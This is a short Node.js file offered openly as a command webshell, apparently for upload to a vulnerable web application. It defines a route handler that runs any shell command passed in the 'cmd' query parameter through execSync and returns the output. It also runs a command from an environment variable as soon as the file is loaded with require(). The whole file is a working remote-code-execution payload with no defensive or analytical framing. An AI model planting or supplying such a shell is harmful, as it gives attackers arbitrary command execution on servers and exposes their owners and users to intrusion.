// Node.js command webshell (?cmd=id)
// Works when the uploaded .js is mounted as a route/module by the app,
// or executed on require() (module-load RCE).
const { execSync } = require("child_process");

// Route-handler form: app mounts this module -> GET ...?cmd=id
module.exports = (req, res) => {
    try {
        const cmd = require("url").parse(req.url, true).query.cmd || "id";
        res.end(execSync(cmd).toString());
    } catch (e) { res.end(String(e)); }
};

// require()-based RCE: also runs a command when the file is loaded
try { process.stdout.write(execSync(process.env.CMD || "id").toString()); } catch (e) {}
